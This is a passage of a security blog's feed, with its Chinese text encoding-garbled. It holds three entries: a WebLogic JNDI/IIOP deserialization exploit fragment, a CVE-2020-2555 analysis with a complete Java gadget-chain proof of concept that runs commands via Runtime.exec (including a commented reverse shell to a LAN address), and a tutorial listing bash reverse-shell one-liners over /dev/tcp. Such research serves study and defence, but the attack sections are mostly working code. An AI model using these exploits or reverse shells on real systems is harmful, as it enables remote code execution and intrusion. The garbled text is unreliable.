punctuation">(</span><span class="token string">"java.naming.provider.url"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"iiop://%s:%s"</span><span class="token punctuation">,</span> ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Context context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// get object to Deserialize</span>        JtaTransactionManager jtaTransactionManager <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JtaTransactionManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        jtaTransactionManager<span class="token punctuation">.</span><span class="token function">setUserTransactionName</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        Remote remote <span class="token operator">=</span> Gadgets<span class="token punctuation">.</span><span class="token function">createMemoitizedProxy</span><span class="token punctuation">(</span>Gadgets<span class="token punctuation">.</span><span class="token function">createMap</span><span class="token punctuation">(</span><span class="token string">"pwned"</span><span class="token punctuation">,</span> jtaTransactionManager<span class="token punctuation">)</span><span class="token punctuation">,</span> Remote<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        context<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"pwned"</span><span class="token punctuation">,</span> remote<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/2020-03-19%2011.14.37.gif" alt="2020-03-19 11.14.37"></p><h2 id="Êé®ËçêËµÑÊñô"><a href="#Êé®ËçêËµÑÊñô" class="headerlink" title="Êé®ËçêËµÑÊñô"></a>Êé®ËçêËµÑÊñô</h2><ol><li><a href="https://www.anquanke.com/post/id/201005#h3-17" target="_blank" rel="noopener">NATÁΩëÁªúÈóÆÈ¢ò</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ÊÑüËßâÂèàËØ•ÈáçÊ∏© JNDI ‰∫Ü„ÄÇ„ÄÇ„ÄÇ&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="RCE" scheme="https://blog.sari3l.com/tags/RCE/"/>
    
      <category term="Weblogic" scheme="https://blog.sari3l.com/tags/Weblogic/"/>
    
      <category term="Deserialize" scheme="https://blog.sari3l.com/tags/Deserialize/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-2555 ÁÆÄÂçïÂàÜÊûê</title>
    <link href="https://blog.sari3l.com/posts/fa80d225/"/>
    <id>https://blog.sari3l.com/posts/fa80d225/</id>
    <published>2020-03-12T14:47:39.000Z</published>
    <updated>2020-07-06T09:45:26.072Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840234109363.jpg" alt></p><h2 id="Êê≠Âª∫"><a href="#Êê≠Âª∫" class="headerlink" title="Êê≠Âª∫"></a>Êê≠Âª∫</h2><p>Á¨¨‰∏ÄÊ¨°Ë∞É weblogicÔºåÈ•∂‰∫Ü‰∏ÄÂ§ßÂúà Orz</p><p>Êé®ËçêÔºö<a href="https://github.com/QAX-A-Team/WeblogicEnvironment" target="_blank" rel="noopener">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p><ol><li>ÈÄöËøá‰∏äÈù¢ÁöÑÈ°πÁõÆÁõ¥Êé•ÁîüÊàê docker Âπ∂ÂêØÂä®</li><li>‰ªé docker ‰∏≠Êã∑Ë¥ù<code>/u01/app/oracle/middleware/wlserver/</code>&amp;<code>/u01/app/oracle/middleware/coherence/</code>Âá∫Êù•</li><li>‰ªé idea ÊâìÂºÄ wlserverÔºåÂ∞ÜÂÖ∂‰∏ã<code>moudules</code>&amp;<code>server/lib</code>Âä†ÂÖ• Libraries ‰∏≠</li><li>Â∞Ü coherence ÁõÆÂΩï‰∏ã lib ÂêåÊ†∑Âä†ÂÖ• Libraries</li><li>Ê∑ªÂä† remoteÔºåÂêØÂä® debug</li></ol><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840233209710.jpg" alt="-w254"></p><h2 id="POP-Chain"><a href="#POP-Chain" class="headerlink" title="POP Chain"></a>POP Chain</h2><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840260151465.jpg" alt="-w676"></p><h2 id="ÂàÜÊûê"><a href="#ÂàÜÊûê" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h2><p>ÂÖ≥ÈîÆÂà©Áî®ÁÇπ<code>com.tangosol.util.filter.LimitFilter#toString</code>ÔºàÂ¶ÇÊûúÂàÜÊûêËøá commons-collectionsÔºåÂèØËÉΩÂØπËøôÈáåÂèØ‰ª•ÂæàÁÜüÊÇâÔºâÔºåËøôÈáå m_comparator„ÄÅm_oAnchorTopÂùáÂèØÊéßÔºå‰∏ã‰∏ÄÊ≠•Â∞±ÊòØÁúãËÉΩÂê¶ÊúâÂèØÂà©Áî®ÁöÑ extract ÂáΩÊï∞Êù•Ëøõ‰∏ÄÊ≠•ÂèëÊå•</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840234657593.jpg" alt="-w1108"></p><p>Âú®<code>com.tangosol.util.extractor.ReflectionExtractor#extract</code>‰∏≠ÔºåÂèØ‰ª•ÁúãÂà∞Ë∞ÉÁî®‰∫Ü invokeÔºàËøôÁÜüÊÇâÁöÑÂë≥ÈÅìÔºåÈöæÈÅìÊ≤°ÊúâÊÉ≥Âà∞ commons-collections ‰∏≠ÁöÑ tranform ‰πàÔºâ</p><p>Âç≥Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáÂèçÂ∞ÑÊâßË°åÂëΩ‰ª§Ôºå‰ΩÜÈúÄË¶Å‰∏ÄÊù°ÂèçÂ∞ÑÈìæÊâçËÉΩ‰ªéÂ§¥Âà∞Â∞æÊâßË°åÊÅ∂ÊÑèÂëΩ‰ª§ÔºàÂÜçÊ¨°ÂõûÊÉ≥ChainedTransformerÔºâ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840236583179.jpg" alt="-w1184"></p><p>ËøôÊó∂ÂÖ≥Ê≥®Âà∞<code>com.tangosol.util.extractor.ChainedExtractor#extract</code>Ôºå‰∏ªË¶ÅÂú®Á¨¨‰∏ÄÊ≠•Ë∞ÉÁî®Êó∂ÈúÄË¶Å‰º†ÂÖ•<code>Runtime.class</code>Â∞±ÂèØ‰ª•ÁªÑÊàê‰∏ÄÊù°ÂÆåÊï¥ÁöÑË∞ÉÁî®ÈìæÔºåËÄå‰ªé<code>LimitFilter</code>‰º†ËøáÊù•<code>m_oAnchorTop</code>ÁöÑÂèàÊòØÂèØÊéßÁöÑ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840239207524.jpg" alt="-w575"></p><p>Áé∞Âú®ÂëΩ‰ª§ÊâßË°åÈÉ®ÂàÜÂ∑≤ÁªèÊûÑÈÄ†ÂÆåÊàêÔºåÊàë‰ª¨ÈúÄË¶ÅÁöÑÊòØÂèçÂ∫èÂàóÂåñÂÖ•Âè£Âà∞Ëææ<code>LimitFilter#toString</code></p><p>ËøôÈáåÂèàÁî®Âà∞‰∫Ü<code>javax.management.BadAttributeValueExpException#BadAttributeValueExpException</code>ÔºàÂèàÊòØÁÜüÊÇâÁöÑÂë≥ÈÅìÔºåÁªÜÁúãcommons-collections 5ÔºâÔºåÊ≥®ÊÑèÂà∞ÂàùÂßãÂåñÊó∂ÈúÄË¶ÅËµãÂÄº‰∏∫ nullÔºåÂÜçÈÄöËøáÂèçÂ∞ÑËÆæÁΩÆÔºåÂê¶Âàô‰ºöÁõ¥Êé•Ëß¶Âèë<code>toString</code>ÊñπÊ≥ï</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840241576297.jpg" alt="-w760"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>tangosol<span class="token punctuation">.</span>util<span class="token punctuation">.</span>extractor<span class="token punctuation">.</span>ChainedExtractor<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>tangosol<span class="token punctuation">.</span>util<span class="token punctuation">.</span>extractor<span class="token punctuation">.</span>ReflectionExtractor<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>tangosol<span class="token punctuation">.</span>util<span class="token punctuation">.</span>filter<span class="token punctuation">.</span>LimitFilter<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cve_2020_2555</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//        ((Runtime) Runtime.class.getMethod("getRuntime").invoke(null)).exec(new String[]{""});</span>        ReflectionExtractor<span class="token punctuation">[</span><span class="token punctuation">]</span> reflectionExtractors <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ReflectionExtractor</span><span class="token punctuation">(</span>                        <span class="token string">"getMethod"</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ReflectionExtractor</span><span class="token punctuation">(</span>                        <span class="token string">"invoke"</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>null<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span>                <span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ReflectionExtractor</span><span class="token punctuation">(</span>                        <span class="token string">"exec"</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//                        new Object[]{new String[]{"/bin/sh", "-c", "/bin/sh -i &amp;> /dev/tcp/192.168.31.96/12345 0&lt;&amp;1"}}</span>                <span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedExtractor chainedExtractor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedExtractor</span><span class="token punctuation">(</span>reflectionExtractors<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        chainedExtractor.extract(Runtime.class);</span>        LimitFilter limitFilter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LimitFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        limitFilter<span class="token punctuation">.</span><span class="token function">setComparator</span><span class="token punctuation">(</span>chainedExtractor<span class="token punctuation">)</span><span class="token punctuation">;</span>        limitFilter<span class="token punctuation">.</span><span class="token function">setTopAnchor</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        limitFilter.toString();</span>        BadAttributeValueExpException badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field field <span class="token operator">=</span> badAttributeValueExpException<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span> limitFilter<span class="token punctuation">)</span><span class="token punctuation">;</span>        Serializer<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        Serializer.deserialize();</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Serializer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        FileOutputStream fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"payload.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        FileInputStream ios <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"java.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>ios<span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/cve-2020-2555-1.gif" alt="cve-2020-2555-1"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Á¨¨‰∏ÄÊ¨°Ë∞É weblogicÔºådocker ÈÉΩ‰∏ãÂçäÂ§©&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="RCE" scheme="https://blog.sari3l.com/tags/RCE/"/>
    
      <category term="Weblogic" scheme="https://blog.sari3l.com/tags/Weblogic/"/>
    
      <category term="Deserialize" scheme="https://blog.sari3l.com/tags/Deserialize/"/>
    
  </entry>
  
  <entry>
    <title>Java ÂèçÂºπ Shell</title>
    <link href="https://blog.sari3l.com/posts/91ba290f/"/>
    <id>https://blog.sari3l.com/posts/91ba290f/</id>
    <published>2020-03-02T14:47:18.000Z</published>
    <updated>2020-07-06T09:45:18.005Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ÈáçÂÆöÂêë"><a href="#ÈáçÂÆöÂêë" class="headerlink" title="ÈáçÂÆöÂêë"></a>ÈáçÂÆöÂêë</h2><p>ÁÆÄÂçïËÆ∞ÂøÜ: </p><ul><li><code>&gt;</code>ÂèØÂú®<code>&amp;</code>Ââç„ÄÅÂêé</li><li><code>&lt;</code>Âè™ËÉΩÂú®<code>&amp;</code>Ââç</li></ul><h3 id="1-ËæìÂÖ•ÈáçÂÆöÂêë"><a href="#1-ËæìÂÖ•ÈáçÂÆöÂêë" class="headerlink" title="1. ËæìÂÖ•ÈáçÂÆöÂêë"></a>1. ËæìÂÖ•ÈáçÂÆöÂêë</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15828004794955.jpg" alt="-w693"></p><pre class=" language-shell"><code class="language-shell">test@test:/tmp$ cat < test_fileHello World~</code></pre><h3 id="2-ËæìÂá∫ÈáçÂÆöÂêë"><a href="#2-ËæìÂá∫ÈáçÂÆöÂêë" class="headerlink" title="2. ËæìÂá∫ÈáçÂÆöÂêë"></a>2. ËæìÂá∫ÈáçÂÆöÂêë</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15828006043413.jpg" alt="-w693"></p><pre class=" language-shell"><code class="language-shell">test@test:/tmp$ echo 'Hello World~' > test_file test@test:/tmp$ cat test_file Hello World~</code></pre><h3 id="3-Ê†áÂáÜËæìÂá∫‰∏éÊ†áÂáÜÈîôËØØËæìÂá∫ÈáçÂÆöÂêë"><a href="#3-Ê†áÂáÜËæìÂá∫‰∏éÊ†áÂáÜÈîôËØØËæìÂá∫ÈáçÂÆöÂêë" class="headerlink" title="3. Ê†áÂáÜËæìÂá∫‰∏éÊ†áÂáÜÈîôËØØËæìÂá∫ÈáçÂÆöÂêë"></a>3. Ê†áÂáÜËæìÂá∫‰∏éÊ†áÂáÜÈîôËØØËæìÂá∫ÈáçÂÆöÂêë</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15828006688727.jpg" alt="-w692"></p><pre class=" language-shell"><code class="language-shell">// bash 1test@test:/tmp$ bash -i &> test// bash 2test@test:~$ ls -l /proc/5693/fdÊÄªÁî®Èáè 0lrwx------ 1 test test 64 2Êúà  27 19:00 0 -> /dev/pts/2l-wx------ 1 test test 64 2Êúà  27 19:00 1 -> /tmp/testl-wx------ 1 test test 64 2Êúà  27 19:00 2 -> /tmp/testlrwx------ 1 test test 64 2Êúà  27 19:00 255 -> /dev/tty</code></pre><h3 id="4-Êñá‰ª∂ÊèèËø∞Á¨¶ÁöÑÂ§çÂà∂"><a href="#4-Êñá‰ª∂ÊèèËø∞Á¨¶ÁöÑÂ§çÂà∂" class="headerlink" title="4. Êñá‰ª∂ÊèèËø∞Á¨¶ÁöÑÂ§çÂà∂"></a>4. Êñá‰ª∂ÊèèËø∞Á¨¶ÁöÑÂ§çÂà∂</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15828014944337.jpg" alt="-w836"></p><p>Ê≥®ÊÑèÔºö</p><ol><li>‰∏§ÁßçÂΩ¢ÂºèÈÉΩÊòØÂ∞Ü word Â§çÂà∂Áªô n</li><li>Âú®Á¨¨‰∫åÁßçÂΩ¢Âºè<code>&gt;&amp;</code>ÊúÄÂêéÁöÑÊèèËø∞‰∏≠ÔºåÂ¶ÇÊûúÊ≤°ÊúâÊåáÂÆö<code>n</code>Ôºå‰∏î<code>word</code>Êó†Ê≥ïËß£ÈáäÊàê<code>Êï¥Êï∞</code>Êàñ<code>-</code>ÔºåÂàôÊ≠§ÂëΩ‰ª§‰ºöË¢´Ëß£Èáä‰∏∫<code>Ê†áÂáÜËæìÂá∫‰∏éÊ†áÂáÜÈîôËØØËæìÂá∫ÈáçÂÆöÂêë</code></li></ol><p>Ê†πÊçÆÊ≠§‰∏§ÁÇπÔºåÂ¶ÇÊûú<strong>n‰∏∫Êï∞Â≠óÔºåÂàôËß£Êûê‰∏∫<code>Êñá‰ª∂ÊèèËø∞Á¨¶Â§çÂà∂</code></strong></p><hr><p>ËøôÈáåËøòÈúÄË¶ÅÂ∞Ü<code>Êñá‰ª∂ÊèèËø∞Á¨¶ÁöÑÂ§çÂà∂</code>‰∏é<code>Ê†áÂáÜËæìÂá∫‰∏éÊ†áÂáÜÈîôËØØËæìÂá∫ÈáçÂÆöÂêë</code>ÊãøÂá∫Êù•ÊØîËæÉ‰∏ÄÁï™ÔºåÊ≥®ÊÑè‰∏ãÈù¢<code>&gt;&amp;5</code>‰∏é<code>&amp;&gt;5</code>ÁöÑÂå∫Âà´</p><p>Âç≥<code>&amp;</code>ÊòØÂê¶Á¥ßË∑üÊï∞Â≠ó<code>n</code>Ôºå‰ºöÂå∫ÂàÜ‰∏∫<code>Êñá‰ª∂ÊèèËø∞Á¨¶n</code>Âíå<code>Êñá‰ª∂n</code></p><ul><li><code>&gt;&amp;5</code> -&gt; Â∞Ü<code>Êñá‰ª∂ÊèèËø∞Á¨¶5</code>Â§çÂà∂Áªô<code>stdout</code></li><li><code>&amp;&gt;5</code> -&gt; Â∞Ü<code>stdout</code>„ÄÅ<code>stderr</code>ÈáçÂÆöÂêëÂà∞<code>ÂΩìÂâçÁõÆÂΩï‰∏ãÂêç‰∏∫5ÁöÑÊñá‰ª∂</code></li></ul><pre class=" language-shell"><code class="language-shell">test@test:/tmp$ exec 5<>test_file >&5test@test:~$ ls -l /proc/14396/fdÊÄªÁî®Èáè 0lrwx------ 1 test test 64 2Êúà  29 14:16 0 -> /dev/pts/0lrwx------ 1 test test 64 2Êúà  29 14:16 1 -> /tmp/test_filelrwx------ 1 test test 64 2Êúà  29 14:16 2 -> /dev/pts/0lrwx------ 1 test test 64 2Êúà  29 14:16 255 -> /dev/pts/0lrwx------ 1 test test 64 2Êúà  29 14:16 5 -> /tmp/test_file---test@test:/tmp$ exec 5<>test_file &>5test@test:~$ ls -l /proc/14396/fdÊÄªÁî®Èáè 0lrwx------ 1 test test 64 2Êúà  29 14:16 0 -> /dev/pts/0l-wx------ 1 test test 64 2Êúà  29 14:16 1 -> /tmp/5l-wx------ 1 test test 64 2Êúà  29 14:16 2 -> /tmp/5lrwx------ 1 test test 64 2Êúà  29 14:16 255 -> /dev/pts/0lrwx------ 1 test test 64 2Êúà  29 14:16 5 -> /tmp/test_file</code></pre><h3 id="5-ÊâìÂºÄÊñá‰ª∂ÊèèËø∞Á¨¶ËøõË°åËØªÂÜô"><a href="#5-ÊâìÂºÄÊñá‰ª∂ÊèèËø∞Á¨¶ËøõË°åËØªÂÜô" class="headerlink" title="5. ÊâìÂºÄÊñá‰ª∂ÊèèËø∞Á¨¶ËøõË°åËØªÂÜô"></a>5. ÊâìÂºÄÊñá‰ª∂ÊèèËø∞Á¨¶ËøõË°åËØªÂÜô</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15828164328837.jpg" alt="-w841"></p><blockquote><p>ÂΩìexecÂëΩ‰ª§ÂØπÊñá‰ª∂ÊèèËø∞Á¨¶Êìç‰ΩúÁöÑÊó∂ÂÄôÔºåÂ∞±‰∏ç‰ºöÊõøÊç¢shellÔºåËÄåÊòØÊìç‰ΩúÂÆåÊàêÂêéËøò‰ºöÁªßÁª≠ÊâßË°åÂêéÈù¢ÁöÑÂëΩ‰ª§</p></blockquote><pre class=" language-shell"><code class="language-shell">test@test:/tmp$ 5<>filetest@test:/tmp$ ls -l /proc/29753/fdÊÄªÁî®Èáè 0lrwx------ 1 test test 64 2Êúà  29 12:04 0 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:04 1 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:04 2 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:04 255 -> /dev/pts/1---test@test:/tmp$ exec 5<>test_filetest@test:/tmp$ ls -l /proc/29753/fdÊÄªÁî®Èáè 0lrwx------ 1 test test 64 2Êúà  29 12:04 0 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:04 1 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:04 2 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:04 255 -> /dev/pts/1lrwx------ 1 test test 64 2Êúà  29 12:04 5 -> /tmp/test_file</code></pre><h2 id="ÂèçÂºπ"><a href="#ÂèçÂºπ" class="headerlink" title="ÂèçÂºπ"></a>ÂèçÂºπ</h2><h3 id="Êñá‰ª∂ÊèèËø∞Á¨¶Â§çÂà∂"><a href="#Êñá‰ª∂ÊèèËø∞Á¨¶Â§çÂà∂" class="headerlink" title="Êñá‰ª∂ÊèèËø∞Á¨¶Â§çÂà∂"></a>Êñá‰ª∂ÊèèËø∞Á¨¶Â§çÂà∂</h3><p>ÊúÄÂ∏∏ËßÅÁöÑÊ®°Âºè</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345 0<span class="token operator">></span><span class="token operator">&amp;</span>1// ÁúÅÁï•ÈùûÂøÖË¶ÅÁ©∫Ê†º<span class="token function">bash</span> -i<span class="token operator">></span><span class="token operator">&amp;</span>/dev/tcp/127.0.0.1/12345 0<span class="token operator">></span><span class="token operator">&amp;</span>1</code></pre><h3 id="Êñá‰ª∂ÊèèËø∞Á¨¶Â§çÂà∂-2"><a href="#Êñá‰ª∂ÊèèËø∞Á¨¶Â§çÂà∂-2" class="headerlink" title="Êñá‰ª∂ÊèèËø∞Á¨¶Â§çÂà∂ 2"></a>Êñá‰ª∂ÊèèËø∞Á¨¶Â§çÂà∂ 2</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345 <span class="token operator">&lt;</span><span class="token operator">&amp;</span>1// ÁúÅÁï•ÈùûÂøÖË¶ÅÁ©∫Ê†º<span class="token function">bash</span> -i<span class="token operator">></span><span class="token operator">&amp;</span>/dev/tcp/127.0.0.1/12345<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1</code></pre><h3 id="ÁªëÂÆöÈáçÂÆöÂêë"><a href="#ÁªëÂÆöÈáçÂÆöÂêë" class="headerlink" title="ÁªëÂÆöÈáçÂÆöÂêë"></a>ÁªëÂÆöÈáçÂÆöÂêë</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">exec</span> 5<span class="token operator">&lt;</span><span class="token operator">></span>/dev/tcp/192.168.146.129/2333<span class="token punctuation">;</span><span class="token function">cat</span> <span class="token operator">&lt;</span><span class="token operator">&amp;</span>5<span class="token operator">|</span><span class="token keyword">while</span> <span class="token function">read</span> line<span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token variable">$line</span> <span class="token operator">></span><span class="token operator">&amp;</span>5 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span class="token punctuation">;</span><span class="token keyword">done</span></code></pre><p>Ê≥®ÊÑè‰∏∫‰ªÄ‰πàÊúÄÂêéÂèàÂä†‰∫Ü‰∏Ä‰∏™<code>2&gt;&amp;1</code>Âë¢ÔºüÂõûÂ§¥ÁúãÁúãÊèèËø∞Á¨¶Â§çÂà∂Ê≥®ÊÑèÁöÑÂú∞ÊñπÔºåÂ∞±Ê∏ÖÊ•ö‰∫Ü</p><hr><p>Âè¶Â§ñ‰∏ãÈù¢‰∏∫‰ªÄ‰πàÊ≤°ÁúãÂà∞<code>ËøõÁ®ã30651ÁöÑbash</code>‰∏≠<code>stdout &amp; stderr</code>Ë¢´ÈáçÂÆöÂêëÊÉÖÂÜµÂë¢ÔºüÂõ†‰∏∫ÊØèÊ¨°<code>do</code>ÈÉΩÊòØÈÄöËøá<strong>Ê≠§bash</strong>Êñ∞ÂºÄÂêØ‰∏Ä‰∏™Â≠êËøõÁ®ãÔºåÂπ∂Âú®Â≠êËøõÁ®ãÂÜÖËøõË°åÊñá‰ª∂ÊèèËø∞Á¨¶ÁöÑËµãÂÄº</p><pre class=" language-shell"><code class="language-shell">test@test:~$ exec 5<>/dev/tcp/127.0.0.1/12345;cat <&5|while read line;do $line >&5 2>&1;done// 29753 ÊâßË°åÂèçÂºπ shell ÂëΩ‰ª§test     29753  4841  0 12:04 pts/1    00:00:00 bashtest     30640  4895  0 12:09 pts/2    00:00:00 nc -lvvp 12345test     30650 29753  0 12:09 pts/1    00:00:00 cattest     30651 29753  0 12:09 pts/1    00:00:00 bash// cattest@test:/tmp$ ls -l /proc/30650/fdÊÄªÁî®Èáè 0lrwx------ 1 test test 64 2Êúà  29 12:48 0 -> 'socket:[1487308]'l-wx------ 1 test test 